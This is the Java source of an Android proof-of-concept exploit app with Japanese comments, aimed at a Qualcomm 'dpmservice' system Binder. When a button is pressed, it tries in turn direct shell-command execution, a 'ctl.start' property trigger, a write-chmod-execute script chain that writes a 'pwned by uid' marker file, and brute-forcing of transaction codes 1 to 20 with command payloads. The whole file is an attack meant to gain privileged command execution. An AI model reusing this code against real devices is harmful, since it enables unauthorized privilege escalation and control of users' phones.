package com.example.dpmpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private static final String TAG = "DpmPoc";
    private static final String TARGET_SERVICE_NAME = "dpmservice";
    private TextView tvResult;
    private Button btnExploit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvResult = findViewById(R.id.tvResult);
        btnExploit = findViewById(R.id.btnExploit);

        btnExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 複合的な攻撃を順次実行
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        executeMultiStageExploit();
                    }
                }).start();
            }
        });
    }

    /**
     * 1. ServiceManager からシステムBinderを取得（リフレクション）
     */
    private IBinder getDpmServiceBinder() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, TARGET_SERVICE_NAME);
        } catch (Exception e) {
            Log.e(TAG, "ServiceManager取得失敗", e);
            return null;
        }
    }

    /**
     * 多角的攻撃エントリポイント
     */
    private void executeMultiStageExploit() {
        final IBinder binder = getDpmServiceBinder();
        if (binder == null) {
            showResult("❌ Binder取得失敗: " + TARGET_SERVICE_NAME + " が存在しません");
            return;
        }

        showResult("✅ Binder取得成功。攻撃シーケンスを開始...");

        // ---- 戦略1: 想定AIDLメソッドを直接呼び出し (トランザクションコード想定) ----
        boolean directExec = tryDirectExec(binder);
        if (directExec) {
            showResult("✅ 戦略1成功: 直接 executeShellCommand が機能しました");
            return;
        }

        // ---- 戦略2: プロパティ経由で init スクリプトを起動 (ctl.start) ----
        boolean propTrigger = tryPropertyTrigger(binder);
        if (propTrigger) {
            showResult("✅ 戦略2成功: setSystemProperty 経由で ctl.start を発行");
            return;
        }

        // ---- 戦略3: スクリプト書き込み + chmod → 実行 (writeFile + setPerm) ----
        boolean fileChain = tryFileBasedExec(binder);
        if (fileChain) {
            showResult("✅ 戦略3成功: ファイル書き込み＆実行権限付与でスクリプト実行");
            return;
        }

        // ---- 戦略4: 総当たりトランザクションコード探索 (1～20) ----
        boolean bruteFound = bruteForceTransactionCodes(binder);
        if (bruteFound) {
            showResult("✅ 戦略4成功: 未知のトランザクションコードを発見＆実行");
            return;
        }

        showResult("❌ 全ての戦略が失敗しました。サービス実装に exec 系メソッドが存在しない可能性が高い");
    }

    // ================================================================
    // 戦略1: 直接的なシェル実行 (トランザクションコード = 1 を仮定)
    // ================================================================
    private boolean tryDirectExec(IBinder binder) {
        String testCmd = "id > /data/local/tmp/dpm_poc_direct.txt 2>&1";
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken("com.qti.dpm.IDpmService");
            data.writeString(testCmd);
            // FIRST_CALL_TRANSACTION = 1 (AIDLの1番目のメソッド)
            boolean ret = binder.transact(1, data, reply, 0);
            reply.readException(); // ここでSecurityExceptionが出なければ通過
            showResult("  [Direct] transact結果: " + ret + ", 例外なし → 成功の可能性");
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Direct exec失敗", e);
            return false;
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    // ================================================================
    // 戦略2: システムプロパティを操作して ctl.start をトリガー
    // ================================================================
    private boolean tryPropertyTrigger(IBinder binder) {
        // プロパティ経由でシステムサービス起動 (例: exec_dpm_poc というserviceを.rcに仮定)
        // もしくは persist.sys に値を書き込んで init の動作を変更
        String key = "ctl.start";
        String value = "exec_dpm_poc"; // 事前に /vendor/etc/init/ に定義されたサービス名
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken("com.qti.dpm.IDpmService");
            data.writeString(key);
            data.writeString(value);
            // トランザクションコード = 2 (setSystemProperty と仮定)
            boolean ret = binder.transact(2, data, reply, 0);
            reply.readException();
            showResult("  [Property] ctl.start 発行試行: " + ret);
            // 実際にプロパティが変更されたかは /data/local/tmp/ の監視で確認
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Property trigger失敗", e);
            return false;
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    // ================================================================
    // 戦略3: スクリプト書き込み + chmod + 実行（3ステップチェーン）
    // ================================================================
    private boolean tryFileBasedExec(IBinder binder) {
        String scriptPath = "/data/local/tmp/dpm_run.sh";
        String scriptContent = "#!/system/bin/sh\n" +
                "id > /data/local/tmp/dpm_file_result.txt\n" +
                "echo 'pwned by uid='$(id -u) >> /data/local/tmp/dpm_file_result.txt\n";

        // Step A: writeFile (code=3)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken("com.qti.dpm.IDpmService");
            data.writeString(scriptPath);
            data.writeByteArray(scriptContent.getBytes("UTF-8"));
            boolean ret = binder.transact(3, data, reply, 0);
            reply.readException();
            showResult("  [File] writeFile結果: " + ret);
        } catch (Exception e) {
            Log.w(TAG, "writeFile失敗", e);
            return false;
        } finally {
            data.recycle();
            reply.recycle();
        }

        // Step B: chmod 755 (code=4)
        Parcel data2 = Parcel.obtain();
        Parcel reply2 = Parcel.obtain();
        try {
            data2.writeInterfaceToken("com.qti.dpm.IDpmService");
            data2.writeString(scriptPath);
            data2.writeInt(0755);
            boolean ret2 = binder.transact(4, data2, reply2, 0);
            reply2.readException();
            showResult("  [File] setFilePermissions結果: " + ret2);
        } catch (Exception e) {
            Log.w(TAG, "setFilePermissions失敗", e);
            return false;
        } finally {
            data2.recycle();
            reply2.recycle();
        }

        // Step C: 実際にスクリプトを実行 (再度 code=1 を使って executeShellCommand)
        // ここではcode=1で "/system/bin/sh /data/local/tmp/dpm_run.sh" を実行
        Parcel data3 = Parcel.obtain();
        Parcel reply3 = Parcel.obtain();
        try {
            data3.writeInterfaceToken("com.qti.dpm.IDpmService");
            data3.writeString("/system/bin/sh " + scriptPath);
            boolean ret3 = binder.transact(1, data3, reply3, 0);
            reply3.readException();
            showResult("  [File] スクリプト実行試行結果: " + ret3);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "スクリプト実行失敗", e);
            return false;
        } finally {
            data3.recycle();
            reply3.recycle();
        }
    }

    // ================================================================
    // 戦略4: トランザクションコード総当たり (1～20) + 引数パターン
    // ================================================================
    private boolean bruteForceTransactionCodes(IBinder binder) {
        String testPayload = "touch /data/local/tmp/brute_poc.txt";
        for (int code = 1; code <= 20; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.qti.dpm.IDpmService");
                // 文字列1つ、文字列2つ、文字列+int のパターンを試す
                if (code % 3 == 0) {
                    data.writeString(testPayload);
                } else if (code % 3 == 1) {
                    data.writeString("dummy_key");
                    data.writeString(testPayload);
                } else {
                    data.writeString("/data/local/tmp/dummy.sh");
                    data.writeInt(0755);
                }
                boolean ret = binder.transact(code, data, reply, 0);
                reply.readException(); // 例外が飛ばなければ通過
                showResult("  [Brute] Code " + code + " 成功応答 (ret=" + ret + ")");
                // 成功したらそのコードで実際のペイロードを再送
                if (ret) {
                    Parcel data2 = Parcel.obtain();
                    Parcel reply2 = Parcel.obtain();
                    data2.writeInterfaceToken("com.qti.dpm.IDpmService");
                    data2.writeString("id > /data/local/tmp/brute_found.txt");
                    binder.transact(code, data2, reply2, 0);
                    reply2.readException();
                    showResult("  [Brute] Code " + code + " でペイロード送信完了");
                    return true;
                }
            } catch (Exception e) {
                // セキュリティ例外や死例外は無視して次へ
                Log.v(TAG, "Code " + code + " 失敗: " + e.getMessage());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
        return false;
    }

    // UI更新ヘルパー
    private void showResult(final String msg) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tvResult.append(msg + "\n");
                Log.d(TAG, msg);
            }
        });
    }
}
